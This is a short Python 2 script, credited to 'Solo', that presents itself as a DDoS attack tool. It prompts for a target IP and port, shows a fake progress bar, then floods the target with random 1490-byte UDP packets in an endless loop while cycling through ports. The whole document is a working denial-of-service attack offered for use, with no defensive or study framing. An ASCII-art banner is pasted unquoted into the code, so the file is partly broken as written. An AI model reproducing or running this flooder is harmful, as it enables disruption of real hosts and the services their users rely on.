  
#!/usr/bin/python
# -*- coding: ascii -*-
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

print "Created By Solo"
print
   ____            _             _   _                  _                         __  
 / ___|    ___   | |   ___     | | | |   __ _    ___  | | __   ___   _ __     _  \ \ 
 \___ \   / _ \  | |  / _ \    | |_| |  / _` |  / __| | |/ /  / _ \ | '__|   (_)  | |
  ___) | | (_) | | | | (_) |   |  _  | | (_| | | (__  |   <  |  __/ | |       _   | |
 |____/   \___/  |_|  \___/    |_| |_|  \__,_|  \___| |_|\_\  \___| |_|      (_)  | |
                                                                                 /_/ 
print

ip = raw_input("Ip")
port = input  ("Port")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 5
